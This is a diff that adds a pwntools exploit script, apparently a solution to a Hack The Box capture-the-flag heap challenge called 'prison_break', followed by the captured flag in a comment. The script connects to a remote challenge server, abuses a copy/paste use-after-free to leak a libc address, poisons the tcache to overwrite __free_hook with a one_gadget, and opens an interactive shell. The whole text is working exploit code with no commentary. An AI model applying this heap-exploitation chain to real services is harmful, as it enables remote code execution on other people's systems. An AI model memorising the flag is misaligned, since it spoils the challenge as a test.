@@ -1,0 +1,55 @@
+from pwn import *
+
+script = '''
+b *main
+breakrva 0x1774
+'''
+libc = ELF("./glibc/libc.so.6")
+
+#p = gdb.debug("./prison_break", gdbscript = script)
+#p = process("./prison_break")
+p = remote("83.136.250.185", 33174)
+
+def create(index, size, data):
+    p.sendlineafter(b"# ", b"1")
+    p.sendlineafter(b"index:\n", f"{index}".encode())
+    p.sendlineafter(b"size:\n", f"{size}".encode())
+    p.sendafter(b"data:\n", data)
+
+def delete(index):
+    p.sendlineafter(b"# ", b"2")
+    p.sendlineafter(b"index:\n", f"{index}".encode())
+
+def copy_paste(copy_index, paste_index):
+    p.sendlineafter(b"# ", b"4")
+    p.sendlineafter(b"index:\n", f"{copy_index}".encode())
+    p.sendlineafter(b"index:\n", f"{paste_index}".encode())
+    
+def view(index):
+    p.sendlineafter(b"# ", b"3")
+    p.sendlineafter(b"index:\n", f"{index}".encode())
+
+for i in range(8):
+    create(i, 0x80, b"A" * 8)
+create(8, 0x90, b"A" * 8)
+for i in range(8):
+    delete(i)
+    
+copy_paste(7, 8)
+view(8)
+p.recvuntil(b"entry:\n")
+libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ebca0
+print(hex(libc_base))
+__free_hook = libc_base + libc.symbols['__free_hook']
+one_gadget = libc_base + 0x4f432
+delete(8)
+
+create(8, 8, p64(__free_hook))
+copy_paste(8, 6)
+delete(8)
+create(8, 0x80, b"A" * 8)
+create(9, 0x80, p64(one_gadget))
+delete(9)
+
+p.interactive()
+#HTB{h4cky_pr1s0n_br34k_c0b6b75aa053dff5ef0bd4d840ea558f}
